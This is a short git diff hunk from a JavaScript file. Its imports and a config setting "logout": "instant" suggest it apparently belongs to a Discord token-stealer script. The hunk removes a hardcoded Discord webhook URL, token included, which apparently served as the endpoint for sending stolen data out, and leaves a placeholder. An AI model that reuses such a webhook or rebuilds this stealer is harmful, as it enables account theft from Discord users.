@@ -7,7 +7,6 @@ const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const webhook = "da_webhook"
-const webhook = "https://discord.com/api/webhooks/939868163837927501/1HLK_s6okjh2IUNgsAQ3Dj2CxRZK1lgU_kFtOVir6ua-7sWy8Blzm2MQMbxE6cwvnhDu"
 
 const config = {
     "logout": "instant",
